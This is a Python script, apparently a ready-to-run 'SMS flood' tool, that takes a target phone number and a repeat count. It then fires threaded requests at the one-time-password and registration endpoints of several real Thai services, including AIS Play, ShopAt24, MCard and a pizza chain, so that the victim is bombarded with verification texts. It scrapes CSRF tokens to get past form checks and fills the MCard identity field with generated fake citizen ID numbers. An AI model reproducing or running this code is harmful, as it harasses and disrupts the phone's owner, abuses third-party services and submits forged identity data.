import re
import requests,json,time, sys
import threading, random, os, colorama, time, sys
from requests import Session
from threading import Thread
from re import search
from colorama import Fore, init
from colorama import Back as bg
from requests import get


init(convert=True)
textcol = f"{Fore.BLACK}"

def head():
    print(f"""{Fore.RED}\n\n
                {Fore.RESET}         ███████╗██╗      ██████╗  ██████╗ ██████╗     ███████╗███╗   ███╗███████╗   
                {Fore.RESET}         ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗    ██╔════╝████╗ ████║██╔════╝
                {Fore.RESET}         █████╗  ██║     ██║   ██║██║   ██║██║  ██║    ███████╗██╔████╔██║███████╗
                {Fore.RESET}         ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    ╚════██║██║╚██╔╝██║╚════██║
                {Fore.RESET}         ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝    ███████║██║ ╚═╝ ██║███████║
                {Fore.RESET}         ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝╚══════╝
                {Fore.RESET} 
                {Fore.RESET}                            [ > FLOOD SMS BY NODEJS < ]                                   
                {Fore.RESET}                                            
                {Fore.RESET}               [+] | Usage : [PHONE] [AMOUNT]
                {Fore.RESET}               [+] | METHOD : AISPLAY,ICC,VIP,CP,SCGID,MCARD,SHOPAT24,PIZZA,                      
                                                                                                                   """)
        

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def newpage():
    clear()
    head()

newpage()
print("")
print("")


newpage()
print("\n")
print("")
num = input (" [!] | Enter PhoneNumber : > ")
newpage()
print('\n')
print("")
n = int(input(" [+] | Amount : > "))
session = requests.Session()

class SMS():


    def ShopAt(PHONE):
        session = Session()
        token = search( #ShopAt24
            """<input type="hidden" name="_csrf" value="(.*)" />""", 
            session.get("https://www.shopat24.com/register/").text).group(1)
        session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-CSRF-TOKEN": token
            }, data=f"phoneNumber={PHONE}")

    def MCard(PHONE): #MCard
        TOKEN = search('''<input type="hidden" name="_token" value="(.*)">''', session.get("https://www.mcardmall.com/th/apply/check").text).group(1)
        session.post("https://www.mcardmall.com/th/apply/check", headers={
                    "content-type": "application/x-www-form-urlencoded"
                    }, data=f"_token={TOKEN}&mode=check&identity={SMS.CardNumber()}&contact={PHONE}&P0=on&P1=on&P2=on")

    def CardNumber():
        return search(
        """<td height="50" align="center" valign="top"><input name="sample-citizen-id" type="text" id="sample-citizen-id" value="(.*)" o""", 
        get("http://www.kzynet.com/tools/thai_citizen_id_generator/").text).group(1)


    def SCGID(PHONE): #SCGID
        requests.post("https://api.scg-id.com/api/otp/send_otp", headers={
         "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": PHONE})

    def spam_cp(phone): #CP
        requests.post('https://cpfmapi.addressasia.com/wp-json/cpfm/v2/customer/get_otp', data = {'phone': phone})

    def spam_bacarrat(phone): #VIP
        requests.post('https://api.baccaratth.com/api/v1/sendotp', data = {'phone_number': phone})

    def spam_mooncash(phone): #moon_crash
        requests.get('http://m.thaiuang.com/uc/authcode/sms/get/reg/'+phone)

    def spam_pizza(phone): #pizza
        requests.post('https://api2.1112.com/api/v1/otp/create', data = {'phonenumber': phone, 'language': "th"})

    def ICC(PHONE): #ICC
        print(Session().post("https://us-central1-otp-service-icc.cloudfunctions.net/getotp", headers={ 
            "Content-Type": "application/json"
            }, json={"mobile_phone": PHONE,"type":"HISHER"}))

    def AISPlay(PHONE):
        session = Session() #AISPlay
        print(session.post("https://srfng.ais.co.th/login/sendOneTimePW", 
            data=f"msisdn=66{PHONE[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", session.get(
                "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36"}).text).group(1)}'''}))
        time.sleep(0)

def loop1():
    global num
    SMS.AISPlay(num)
    print("ATTACK SMS | METHOD : AISPLAY")

def loop2():
    global num
    SMS.ICC(num)
    print("ATTACK SMS | METHOD : ICC")

def loop3():
    global num
    SMS.spam_bacarrat(num)
    print("ATTACK SMS | METHOD : VIP")

def loop4():
    global num
    SMS.spam_cp(num)
    print("ATTACK SMS | METHOD : CP")

def loop6():
    global num
    SMS.spam_pizza(num)
    print("ATTACK SMS | METHOD : PIZZA")

def loop7():
    global num
    SMS.SCGID(num)
    print("ATTACK SMS | METHOD : SCGID")

def loop8():
    global num
    SMS.ShopAt(num)
    print("ATTACK SMS | METHOD : SHOPAT24")

def loop9():
    global num
    SMS.MCard(num)
    print("ATTACK SMS | METHOD : MCARD")


for i in range(n):
    time.sleep(0.50)
    threading.Thread(target=loop1).start()
    threading.Thread(target=loop2).start()
    threading.Thread(target=loop3).start()
    threading.Thread(target=loop4).start()
    threading.Thread(target=loop6).start()
    threading.Thread(target=loop7).start()
    threading.Thread(target=loop8).start()
    threading.Thread(target=loop9).start()